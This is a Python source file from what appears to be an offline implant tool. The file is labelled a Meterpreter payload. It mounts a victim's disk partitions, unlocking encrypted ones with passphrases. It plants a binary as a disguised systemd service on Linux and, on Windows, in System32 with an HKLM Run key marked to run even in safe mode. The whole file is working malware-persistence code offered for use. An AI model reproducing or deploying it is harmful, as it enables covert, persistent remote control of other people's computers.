#!/usr/bin/python3
"""
Meterpreter payload
"""
from snr.core.payload import context, entry_point, nt_registry, storage
from snr.core.util import common_utils
from snr.core.util.payloads import systemd_service

LINUX_SERVICE_NAME = "@LINUX_SERVICE_NAME@"
LINUX_SERVICE_DESCRIPTION = "@LINUX_SERVICE_DESCRIPTION@"
WINDOWS_SERVICE_NAME = "@WINDOWS_SERVICE_NAME@"
PASSPHRASES = "@PASSPHRASES@"


@entry_point.entry_point
def main(block_info: storage.BlocksType, *_) -> None:
    for part in storage.query_all_partitions(block_info):
        with storage.mount_partition(part, PASSPHRASES) as mounted_part:
            ctx = context.require_context_for_mount_point(
                mounted_part.mount_point)
            # Try to see if we are dealing with any sort of Linux
            if mounted_part.is_linux():
                mounted_part.mkdir(f"usr/lib/libexec/{LINUX_SERVICE_NAME}/")
                mounted_part.copy(
                    "/root/data/linux", f"usr/lib/libexec/{LINUX_SERVICE_NAME}/{LINUX_SERVICE_NAME}")
                with mounted_part.open(f"usr/lib/libexec/{LINUX_SERVICE_NAME}/control", "w",
                                       encoding="utf-8") as stream:
                    stream.write("#!/bin/bash\n")
                    stream.write("echo Action failed\n")
                    stream.write("exit 12\n")
                service = systemd_service.SystemdService(
                    ctx, LINUX_SERVICE_NAME)
                service.Unit_section["Description"] = LINUX_SERVICE_DESCRIPTION
                service.Unit_section["After"] = "network-online.target"
                service.Service_section[
                    "ExecStart"] = f"/usr/lib/libexec/{LINUX_SERVICE_NAME}/{LINUX_SERVICE_NAME}"
                service.Service_section["Type"] = "simple"
                service.Service_section[
                    "ExecRestart"] = f"usr/lib/libexec/{LINUX_SERVICE_NAME}/control restart"
                service.Service_section["ExecStop"] = f"usr/lib/libexec/{
                    LINUX_SERVICE_NAME}/control stop"
                service.Install_section["WantedBy"] = "multi-user.target"
                service.write(False, False)
                mounted_part.link(f"/usr/lib/systemd/system/{LINUX_SERVICE_NAME}.service",
                                  f"/usr/lib/systemd/system/multi-user.target.wants/{LINUX_SERVICE_NAME}.service")
            elif mounted_part.is_windows():
                # Determine executable name
                exe_name = WINDOWS_SERVICE_NAME.title().replace(
                    " ", "").replace("-", "").replace("_", "")
                # Copy the executable
                mounted_part.copy("/root/data/windows",
                                  f"Windows/System32/{exe_name}.exe")
                # Persistance using a HKLM Run key
                registry = nt_registry.NtRegistry(mounted_part)
                run_node = registry.find_node(
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                if run_node is None:
                    # Probably up until CurrentVersion exists, fix it up
                    current_version_node = registry.find_node(
                        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion")
                    if current_version_node is None:
                        # We have zero idea what is going on
                        common_utils.print_error(
                            "Windows registry seems to be corrupted")
                        continue
                    run_node = current_version_node.new_child("Run")
                # The asterisk ensures it runs even in safe mode
                run_node.new_data("*" + exe_name, nt_registry.REG_SZ,
                                  f"Windows/System32/{exe_name}.exe")
            else:
                common_utils.print_warning("Unknown operating system!")

if __name__ == "__main__":
    main()
